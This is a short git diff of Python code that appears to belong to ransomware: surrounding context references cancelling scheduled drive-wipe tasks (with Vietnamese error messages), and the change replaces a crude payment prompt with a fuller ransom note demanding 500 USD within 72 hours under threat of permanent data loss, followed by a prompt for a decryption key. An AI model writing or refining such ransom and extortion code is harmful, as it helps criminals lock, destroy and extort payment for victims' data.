@@ -12,7 +12,13 @@ def cancel_drive_wipe(drives):
             print(f"[-] Không thể hủy task {task_name}: {e}")
 
 def main():
-    print("Please send me 100,00$ and I will send you the key: ")
+    ransom_text = (
+        "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n"
+        "All your important documents, photos, and databases are locked.\n"
+        "To restore access, you must pay 500 USD.\n"
+        "Failure to do so within 72 hours will result in permanent data loss.\n\n"
+    )
+    print(ransom_text)
     key = input("Key: ").encode()  
     
     try:
